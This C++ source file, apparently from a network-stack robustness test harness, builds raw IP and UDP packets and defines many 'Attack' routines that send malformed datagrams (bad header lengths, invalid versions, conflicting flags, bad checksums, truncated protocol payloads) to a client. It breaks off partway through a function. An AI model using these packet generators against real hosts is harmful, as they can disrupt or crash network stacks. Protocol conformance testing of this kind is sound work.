// IPAttacks.cpp : Contains the Sparta code for various IP layer attacks
//

#include "stdafx.h"
#include "AttackConstants.h"

//==================================================================================
// SendIPPacket
//----------------------------------------------------------------------------------
//
// Description: Test that sends an IP packet with the specified parameters
//
// Arguments:
//	
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL SendIPPacket(CInterface *pInterface, CHAR *szDestMac, CHAR *szDestIP, CHAR *szSourceIP, BYTE bVersion, BYTE bHeaderLength, BYTE bTypeOfService, WORD bTotalLength, WORD bID, BYTE bFlags, WORD wFragOffset, BYTE bTimeToLive, BYTE bProtocol, DWORD dwPayloadSize, BOOL fCalcChecksum, BOOL fPadHdr)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	CHAR *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		((bProtocol == PROTOCOL_UDP) && (dwPayloadSize >= UDPHEADER_SIZE)) ? pIPPacket = new CUDPPacket(MediaType) : pIPPacket = new CIPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pIPPacket->MacHeader.SetProtocolType(0x800);
		pIPPacket->IPHeader.SetVersion(bVersion);
		pIPPacket->IPHeader.SetTOS(bTypeOfService);
		pIPPacket->IPHeader.SetID(bID);
		pIPPacket->IPHeader.SetFlag(bFlags);
		pIPPacket->IPHeader.SetFragOffset(wFragOffset);
		pIPPacket->IPHeader.SetTTL(bTimeToLive);
		pIPPacket->IPHeader.SetProtocolType(bProtocol);
		pIPPacket->IPHeader.SetDestAddr(szDestIP);
		pIPPacket->IPHeader.SetSrcAddr(szSourceIP);
		
		// Set up the total length field
		if(bTotalLength)
		{
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(bTotalLength);
		}
		else
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(ON);
		
		// Set up the header length field
		if(bHeaderLength)
		{
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
			pIPPacket->IPHeader.SetHdrLength(bHeaderLength);

			// If the header is bigger than the default, fill it with no-ops
			if((bHeaderLength > IPHEADER_SIZE) && fPadHdr)
			{
				// For each additional double-word in the header beyond the default, add 4 no-opts (1 byte each)
				for(INT DoubleWordIndex = 0; DoubleWordIndex < bHeaderLength - IPHEADER_SIZE ;  DoubleWordIndex++)
				{
					pIPPacket->IPHeader.CreateIPOption(IP_OPTIONS_NO_OPERATION);
				}
			}
		}
		else
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
		
		// Set up the IP header checksum
		if(fCalcChecksum)
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
		else
		{
			pIPPacket->IPHeader.SetAutoCalcChecksum(OFF);
			pIPPacket->IPHeader.SetChecksum(0xFFFF);	// Not guaranteed to fail, but close enough
		}
		
		// Set up the UDP fields if necessary
		if((bProtocol == PROTOCOL_UDP)  && (dwPayloadSize >= UDPHEADER_SIZE))
		{
			WORD HeaderSize = bHeaderLength ? bHeaderLength * 4 : IPHEADER_SIZE;

			CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
			
			pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
			pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);

			// Hard to explain this one...  Basically, for tests where we are overriding the total length
			// field of the IP datagram, and that overridden value is less than the actual amount of data in
			// the packet (including its payload)...  Then we also want to override the length field in the
			// UDP header so that the generated UDP packet is still valid
			if((bTotalLength >= UDPHEADER_SIZE + IPHEADER_SIZE) && (bTotalLength < dwPayloadSize + IPHEADER_SIZE))
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(bTotalLength - IPHEADER_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}
			else
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(ON);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(ON);
			}
			
			// If we are to send data beyond the header, set up the data buffer
			if(dwPayloadSize > UDPHEADER_SIZE)
			{
				// Create the buffer for the remaining packet data
				pBuffer = (CHAR *) LocalAlloc(LPTR, dwPayloadSize - UDPHEADER_SIZE);
				memset(pBuffer, (int) 'x', dwPayloadSize - UDPHEADER_SIZE);
				
				// Associate that buffer with the packet
				pUDPPacket->SetUserBuffer(pBuffer, dwPayloadSize - UDPHEADER_SIZE, TRUE);				
			}
		}
		else if(dwPayloadSize > 0)
		{
			// Create the buffer for the remaining packet data
			pBuffer = (CHAR *) LocalAlloc(LPTR, dwPayloadSize);
			memset(pBuffer, (int) 'x', dwPayloadSize);
			
			// Associate that buffer with the packet
			pIPPacket->SetUserBuffer(pBuffer, dwPayloadSize, TRUE);								
		}
		
		pInterface->Send(*pIPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	pIPPacket ? delete pIPPacket : 0;
	pBuffer ? LocalFree(pBuffer) : 0;

	return fSuccess;
}

//==================================================================================
// IPVersionSixAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating version 6
//
// Arguments:
//	DWORD		FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPVersionSixAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_SIX, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPVersionBadAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating an unknown version (16)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPVersionBadAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_BAD, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPHeaderLenBelowMinAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a header length below the minimum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenBelowMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, IPHEADER_BELOWMIN, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPHeaderLenMaxAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a maximum header length
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenMaxAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, IPHEADER_MAX, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPHeaderLenAboveTotalLenAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a header length larger than the total length
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenAboveTotalLenAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, IPHEADER_MAX, IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPHeaderLenAboveAvailAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a header length larger than the bytes available
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenAboveAvailAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, IPHEADER_MAX, IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, FALSE);
}

//==================================================================================
// IPTosNormalAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a normal type-of-Attackice
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosNormalAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPTosNetControlAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a net-control type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosNetControlAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_NETCONTROL, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPTosLowDelayAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a low-delay type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosLowDelayAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_LOWDELAY, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPTosHighThroughputAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a high-throughput type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosHighThroughputAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_HIGHTHRUPUT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPTosHighReliabilityAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a high-reliability type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosHighReliabilityAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_HIGHRELI, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPTosReservedAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a reserved type-of-service
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosReservedAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_RESERVED, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPLengthBelowMinAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a total length below the minimum possible
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthBelowMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		IPLENGTH_BELOWMIN, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, 0, 0, TRUE, TRUE);
}

//==================================================================================
// IPLengthAtMinAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram indicating a minimum valid total length
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAtMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		IPLENGTH_ATMIN, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, 0, 0, TRUE, TRUE);
}

//==================================================================================
// IPLengthAboveMinAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with a length above the minimum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAboveMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPLengthAboveTotalAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with a length greater than the number of bytes available
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAboveTotalAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 2, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPLengthBelowTotalAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with a length less than the number of bytes available
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthBelowTotalAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		UDPHEADER_SIZE + IPHEADER_SIZE + 1, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 2, TRUE, TRUE);
}

//==================================================================================
// IPLengthMaxAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the maximum single datagram size
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthMaxAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		IPLENGTH_MAX, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, IPLENGTH_MAX - IPHEADER_SIZE, TRUE, TRUE);
}

//==================================================================================
// IPIDMinAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the minimum datagram ID
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPIDMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_MIN, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPIDMaxAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the maximum datagram ID
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPIDMaxAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_MAX, 0, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPFlagReservedSetAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with the reserved bit of the flags field set
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFlagReservedSetAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, IPFLAG_RESERVED, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPFlagDontFragAndMoreFragsAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram both  don't-frag and more-frags flag set
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFlagDontFragAndMoreFragsAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, IPFLAG_DONTFRAG | IPFLAG_MOREFRAGS, 0, IPTTL_DEFAULT, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPTtlMinAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with minimum time-to-live
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTtlMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_MIN, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPTtlMaxAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram with maximum time-to-live
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTtlMaxAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_MAX, PROTOCOL_UDP, UDPHEADER_SIZE + 1, TRUE, TRUE);
}

//==================================================================================
// IPProtocolUnsupportedAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IP datagram of an unsupported protocol
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUnsupportedAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, IPPROTOCOL_UNSUPPORTED, 1, TRUE, TRUE);
}

//==================================================================================
// IPProtocolICMPTooSmallAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends ICMP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolICMPTooSmallAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, IPPROTOCOL_ICMP, 0, TRUE, TRUE);
}

//==================================================================================
// IPProtocolIGMPTooSmallAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends IGMP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolIGMPTooSmallAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, IPPROTOCOL_IGMP, 0, TRUE, TRUE);
}

//==================================================================================
// IPProtocolTCPTooSmallAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends TCP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolTCPTooSmallAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, IPPROTOCOL_TCP, 0, TRUE, TRUE);
}

//==================================================================================
// IPProtocolUDPTooSmallAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends UDP datagram with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUDPTooSmallAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, IPPROTOCOL_UDP, 0, TRUE, TRUE);
}

//==================================================================================
// IPProtocolUnsupportedTooSmallAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram of unsupported protocol with zero bytes beyond the IP header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUnsupportedTooSmallAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, IPPROTOCOL_UNSUPPORTED, 0, TRUE, TRUE);
}

//==================================================================================
// IPChecksumBadAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a bad checksum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPChecksumBadAttack(CInterface *pInterface, CHAR *szDestMac)
{
	return SendIPPacket(pInterface, szDestMac, IPADDR_DEST, IPADDR_SOURCE, IPVERSION_DEFAULT, 0, IPTOS_DEFAULT, 
		0, IPID_DEFAULT, 0, 0, IPTTL_DEFAULT, IPPROTOCOL_UDP, UDPHEADER_SIZE + 1, FALSE, TRUE);
}

//==================================================================================
// IPOptionsAboveAvailAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with an option that is cutoff by the end of the datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsAboveAvailAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CIPOption *pIPOption = NULL;
	CHAR szFormattedDestMac[18];
	CHAR *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		pIPPacket = new CIPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pIPPacket->MacHeader.SetProtocolType(0x800);
		pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pIPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pIPPacket->IPHeader.SetID(IPID_DEFAULT);
		pIPPacket->IPHeader.SetFlag(0);
		pIPPacket->IPHeader.SetFragOffset(0);
